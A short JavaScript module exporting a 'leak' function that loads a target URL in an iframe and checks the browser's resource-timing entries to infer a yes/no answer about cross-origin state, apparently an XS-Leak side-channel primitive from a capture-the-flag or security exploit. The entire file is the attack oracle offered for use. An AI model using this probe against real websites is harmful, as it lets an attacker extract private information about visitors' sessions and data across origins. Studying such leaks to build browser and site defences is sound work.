const leak = async (url) => {
    let em = document.createElement('iframe');
    em.src = url
    return new Promise(async(r) => {
        document.body.appendChild(em)
        await sleep(1000)
        em.remove()
        let len = performance.getEntriesByType("resource").filter((e) => {
            return e.name === url
        }).length
        console.debug(`len = ${len}`)
        if(len !== 0){
            return r(0)
        }else{
            return r(1)
        }        
    })
}

const sleep = (ms) => {
    return new Promise(r => setTimeout(r, ms));
}


export { leak }